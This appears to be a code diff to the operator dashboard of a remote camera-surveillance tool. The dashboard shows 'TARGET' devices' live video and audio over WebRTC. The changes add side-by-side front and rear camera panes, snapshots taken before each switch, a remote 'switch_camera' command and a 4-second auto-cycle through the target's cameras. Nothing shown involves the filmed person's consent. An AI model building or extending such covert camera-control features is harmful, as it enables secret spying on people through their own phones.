@@ -494,32 +494,43 @@
                 <div class="target-card-header">
                     <div class="target-id">
                         <span class="dot"></span>
-                        TARGET [${targetId}]
+                        TARGET [${targetId}] &bull; DUAL CAMERAS
                     </div>
                     <span class="target-status-badge" id="badge-${targetId}">CONNECTING</span>
                 </div>
                 
-                <div class="target-video-wrapper" style="position: relative; background: #000; width: 100%; aspect-ratio: 16 / 9; overflow: hidden; display: flex; align-items: center; justify-content: center;">
-                    <div class="camera-tag" style="position: absolute; top: 12px; left: 12px; z-index: 10; background: rgba(0,0,0,0.75); backdrop-filter: blur(8px); padding: 4px 10px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.15); font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: #fff; display: flex; align-items: center; gap: 6px;">
-                        <span class="dot" id="camDot-${targetId}" style="width: 7px; height: 7px; background: #00f2fe;"></span>
-                        <span id="camLabel-${targetId}">FRONT CAMERA (ACTIVE)</span>
+                <div class="target-dual-grid" style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; background: #050914; padding: 10px; border-radius: 8px; position: relative;">
+                    <!-- Front Camera Window -->
+                    <div class="camera-pane" id="pane-front-${targetId}" onclick="switchCamera('${targetId}', 'user')" style="position: relative; aspect-ratio: 16 / 9; background: #000; border-radius: 6px; overflow: hidden; border: 2px solid #00f2fe; cursor: pointer; transition: all 0.3s ease;">
+                        <div class="camera-tag" style="position: absolute; top: 8px; left: 8px; z-index: 10; background: rgba(0,0,0,0.8); backdrop-filter: blur(6px); padding: 3px 8px; border-radius: 4px; font-family: 'JetBrains Mono', monospace; font-size: 0.68rem; color: #fff; display: flex; align-items: center; gap: 5px;">
+                            <span class="dot" id="dot-front-${targetId}" style="width: 6px; height: 6px; background: #00f2fe; box-shadow: 0 0 8px #00f2fe;"></span>
+                            <span id="label-front-${targetId}">FRONT CAM <b style="color: #00f2fe;">(LIVE)</b></span>
+                        </div>
+                        <video id="video-front-${targetId}" autoplay playsinline muted style="width: 100%; height: 100%; object-fit: cover;"></video>
+                        <canvas id="canvas-front-${targetId}" style="display: none; width: 100%; height: 100%; object-fit: cover;"></canvas>
+                        <div class="video-overlay-loader" id="loader-${targetId}">
+                            <div class="dot" style="animation-duration: 0.8s;"></div>
+                            <span>Connecting Streams...</span>
+                        </div>
                     </div>
 
-                    <video id="video-${targetId}" autoplay playsinline muted style="width: 100%; height: 100%; object-fit: cover; background: #000;"></video>
-                    
-                    <div class="video-overlay-loader" id="loader-${targetId}">
-                        <div class="dot" style="animation-duration: 0.8s;"></div>
-                        <span>Connecting Video Stream...</span>
+                    <!-- Rear Camera Window -->
+                    <div class="camera-pane" id="pane-rear-${targetId}" onclick="switchCamera('${targetId}', 'environment')" style="position: relative; aspect-ratio: 16 / 9; background: #000; border-radius: 6px; overflow: hidden; border: 1px solid rgba(255,255,255,0.15); cursor: pointer; transition: all 0.3s ease;">
+                        <div class="camera-tag" style="position: absolute; top: 8px; left: 8px; z-index: 10; background: rgba(0,0,0,0.8); backdrop-filter: blur(6px); padding: 3px 8px; border-radius: 4px; font-family: 'JetBrains Mono', monospace; font-size: 0.68rem; color: #fff; display: flex; align-items: center; gap: 5px;">
+                            <span class="dot" id="dot-rear-${targetId}" style="width: 6px; height: 6px; background: #94a3b8; box-shadow: none;"></span>
+                            <span id="label-rear-${targetId}">REAR CAM <span style="color: #94a3b8;">(SNAPSHOT)</span></span>
+                        </div>
+                        <video id="video-rear-${targetId}" autoplay playsinline muted style="display: none; width: 100%; height: 100%; object-fit: cover;"></video>
+                        <canvas id="canvas-rear-${targetId}" style="width: 100%; height: 100%; object-fit: cover; background: #080e1a;"></canvas>
                     </div>
                 </div>
 
                 <div class="target-card-footer">
-                    <span id="time-${targetId}">Stream Active</span>
+                    <span id="time-${targetId}">Both Cameras Ready</span>
                     <div style="display: flex; gap: 8px; flex-wrap: wrap;">
                         <button class="btn-action" id="camBtn-${targetId}" onclick="toggleActiveCamera('${targetId}')">🔄 Switch to Rear Camera</button>
-                        <button class="btn-action" id="cycleBtn-${targetId}" onclick="toggleAutoCycle('${targetId}')">🔁 Auto-Switch: OFF</button>
+                        <button class="btn-action" id="cycleBtn-${targetId}" onclick="toggleAutoCycle('${targetId}')">🔁 Auto-Cycle: OFF</button>
                         <button class="btn-action" onclick="requestTargetOffer('${targetId}')">Reconnect</button>
-                        <button class="btn-action" id="zoomBtn-${targetId}" onclick="toggleZoom('${targetId}')">Zoom: Out</button>
                         <button class="btn-action" id="muteBtn-${targetId}" onclick="toggleMute('${targetId}')">Unmute Audio</button>
                         <button class="btn-action" onclick="fullscreenVideo('${targetId}')">Fullscreen</button>
                     </div>
@@ -527,17 +538,25 @@
             `;
             grid.appendChild(card);
 
-            const videoEl = card.querySelector(`#video-${targetId}`);
+            const videoFront = card.querySelector(`#video-front-${targetId}`);
+            const videoRear = card.querySelector(`#video-rear-${targetId}`);
+            const canvasFront = card.querySelector(`#canvas-front-${targetId}`);
+            const canvasRear = card.querySelector(`#canvas-rear-${targetId}`);
             const loaderEl = card.querySelector(`#loader-${targetId}`);
             const badgeEl = card.querySelector(`#badge-${targetId}`);
 
-            videoEl.muted = true;
+            videoFront.muted = true;
+            videoRear.muted = true;
 
             session = {
                 pc: null,
                 pendingIce: [],
                 cardEl: card,
-                videoEl,
+                videoEl: videoFront,
+                videoFront,
+                videoRear,
+                canvasFront,
+                canvasRear,
                 loaderEl,
                 badgeEl,
                 activeCamera: 'user',
@@ -546,6 +565,24 @@
             targets.set(targetId, session);
             updateTargetCount();
             return session;
+        }
+
+        function captureSnapshot(session) {
+            try {
+                if (session.activeCamera === 'user' && session.videoFront && session.canvasFront) {
+                    const ctx = session.canvasFront.getContext('2d');
+                    session.canvasFront.width = session.videoFront.videoWidth || 640;
+                    session.canvasFront.height = session.videoFront.videoHeight || 480;
+                    ctx.drawImage(session.videoFront, 0, 0, session.canvasFront.width, session.canvasFront.height);
+                } else if (session.activeCamera === 'environment' && session.videoRear && session.canvasRear) {
+                    const ctx = session.canvasRear.getContext('2d');
+                    session.canvasRear.width = session.videoRear.videoWidth || 640;
+                    session.canvasRear.height = session.videoRear.videoHeight || 480;
+                    ctx.drawImage(session.videoRear, 0, 0, session.canvasRear.width, session.canvasRear.height);
+                }
+            } catch (e) {
+                console.warn("Snapshot capture note:", e);
+            }
         }
 
         function toggleActiveCamera(targetId) {
@@ -560,12 +597,10 @@
 
             const nextCam = specificMode || (session.activeCamera === 'environment' ? 'user' : 'environment');
             const btn = document.getElementById(`camBtn-${targetId}`);
-            const camLabel = document.getElementById(`camLabel-${targetId}`);
-            const camDot = document.getElementById(`camDot-${targetId}`);
-
             if (btn) btn.innerText = "⏳ Switching...";
-            if (camLabel) camLabel.innerText = nextCam === 'environment' ? "SWITCHING TO REAR..." : "SWITCHING TO FRONT...";
-            if (camDot) { camDot.style.background = "#f59e0b"; camDot.style.boxShadow = "0 0 8px #f59e0b"; }
+
+            // 1. Capture snapshot of active camera before flipping
+            captureSnapshot(session);
 
             if (ws && ws.readyState === WebSocket.OPEN) {
                 console.log(`[*] Sending switch_camera to target ${targetId}: ${nextCam}`);
@@ -586,17 +621,17 @@
                 clearInterval(session.cycleInterval);
                 session.cycleInterval = null;
                 if (btn) {
-                    btn.innerText = "🔁 Auto-Switch: OFF";
+                    btn.innerText = "🔁 Auto-Cycle: OFF";
                     btn.classList.remove('active');
                 }
             } else {
                 if (btn) {
-                    btn.innerText = "🔁 Auto-Switch: ON (5s)";
+                    btn.innerText = "🔁 Auto-Cycle: ON (4s)";
                     btn.classList.add('active');
                 }
                 session.cycleInterval = setInterval(() => {
                     toggleActiveCamera(targetId);
-                }, 5000);
+                }, 4000);
             }
         }
 
@@ -604,10 +639,17 @@
             const session = targets.get(targetId);
             if (!session) return;
 
+            // Capture snapshot of previous frame
+            captureSnapshot(session);
+
             session.activeCamera = activeCam;
             const btn = document.getElementById(`camBtn-${targetId}`);
-            const camLabel = document.getElementById(`camLabel-${targetId}`);
-            const camDot = document.getElementById(`camDot-${targetId}`);
+            const paneFront = document.getElementById(`pane-front-${targetId}`);
+            const paneRear = document.getElementById(`pane-rear-${targetId}`);
+            const dotFront = document.getElementById(`dot-front-${targetId}`);
+            const dotRear = document.getElementById(`dot-rear-${targetId}`);
+            const labelFront = document.getElementById(`label-front-${targetId}`);
+            const labelRear = document.getElementById(`label-rear-${targetId}`);
             const timeLabel = document.getElementById(`time-${targetId}`);
 
             if (error) {
@@ -616,18 +658,54 @@
                     timeLabel.style.color = '#ef4444';
                 }
             } else if (label && timeLabel) {
-                timeLabel.innerText = `Lens: ${label}`;
+                timeLabel.innerText = `Active Lens: ${label}`;
                 timeLabel.style.color = '#94a3b8';
             }
 
             if (activeCam === 'environment') {
                 if (btn) btn.innerText = "🔄 Switch to Front Camera";
-                if (camLabel) camLabel.innerText = "REAR CAMERA (ACTIVE)";
-                if (camDot) { camDot.style.background = "#10b981"; camDot.style.boxShadow = "0 0 8px #10b981"; }
+                if (paneFront) paneFront.style.border = "1px solid rgba(255,255,255,0.15)";
+                if (paneRear) paneRear.style.border = "2px solid #10b981";
+                if (dotFront) { dotFront.style.background = "#94a3b8"; dotFront.style.boxShadow = "none"; }
+                if (dotRear) { dotRear.style.background = "#10b981"; dotRear.style.boxShadow = "0 0 8px #10b981"; }
+                if (labelFront) labelFront.innerHTML = 'FRONT CAM <span style="color: #94a3b8;">(SNAPSHOT)</span>';
+                if (labelRear) labelRear.innerHTML = 'REAR CAM <b style="color: #10b981;">(LIVE)</b>';
+
+                // Display canvas on front, live video on rear
+                if (session.canvasFront) session.canvasFront.style.display = 'block';
+                if (session.videoFront) session.videoFront.style.display = 'none';
+
+                if (session.canvasRear) session.canvasRear.style.display = 'none';
+                if (session.videoRear) {
+                    session.videoRear.style.display = 'block';
+                    if (session.videoFront && session.videoFront.srcObject) {
+                        session.videoRear.srcObject = session.videoFront.srcObject;
+                        session.videoRear.play().catch(() => {});
+                    }
+                }
+                session.videoEl = session.videoRear;
             } else {
                 if (btn) btn.innerText = "🔄 Switch to Rear Camera";
-                if (camLabel) camLabel.innerText = "FRONT CAMERA (ACTIVE)";
-                if (camDot) { camDot.style.background = "#00f2fe"; camDot.style.boxShadow = "0 0 8px #00f2fe"; }
+                if (paneFront) paneFront.style.border = "2px solid #00f2fe";
+                if (paneRear) paneRear.style.border = "1px solid rgba(255,255,255,0.15)";
+                if (dotFront) { dotFront.style.background = "#00f2fe"; dotFront.style.boxShadow = "0 0 8px #00f2fe"; }
+                if (dotRear) { dotRear.style.background = "#94a3b8"; dotRear.style.boxShadow = "none"; }
+                if (labelFront) labelFront.innerHTML = 'FRONT CAM <b style="color: #00f2fe;">(LIVE)</b>';
+                if (labelRear) labelRear.innerHTML = 'REAR CAM <span style="color: #94a3b8;">(SNAPSHOT)</span>';
+
+                // Display canvas on rear, live video on front
+                if (session.canvasRear) session.canvasRear.style.display = 'block';
+                if (session.videoRear) session.videoRear.style.display = 'none';
+
+                if (session.canvasFront) session.canvasFront.style.display = 'none';
+                if (session.videoFront) {
+                    session.videoFront.style.display = 'block';
+                    if (session.videoRear && session.videoRear.srcObject) {
+                        session.videoFront.srcObject = session.videoRear.srcObject;
+                    }
+                    session.videoFront.play().catch(() => {});
+                }
+                session.videoEl = session.videoFront;
             }
         }
 
@@ -751,18 +829,23 @@
             pc.ontrack = (event) => {
                 console.log(`[+] Track received from target ${targetId}:`, event.track.kind);
                 
-                let stream = session.videoEl.srcObject;
+                let stream = (session.videoFront && session.videoFront.srcObject) || (session.videoRear && session.videoRear.srcObject);
                 if (!stream || !(stream instanceof MediaStream)) {
                     stream = new MediaStream();
-                    session.videoEl.srcObject = stream;
                 }
                 
-                // Add track if not already in stream
                 if (!stream.getTracks().some(t => t.id === event.track.id)) {
                     stream.addTrack(event.track);
                 }
 
-                session.videoEl.play().catch(e => console.log("Video playback note:", e));
+                if (session.videoFront) {
+                    session.videoFront.srcObject = stream;
+                    if (session.activeCamera === 'user') session.videoFront.play().catch(() => {});
+                }
+                if (session.videoRear) {
+                    session.videoRear.srcObject = stream;
+                    if (session.activeCamera === 'environment') session.videoRear.play().catch(() => {});
+                }
 
                 if (event.track.kind === 'video') {
                     session.loaderEl.style.display = 'none';
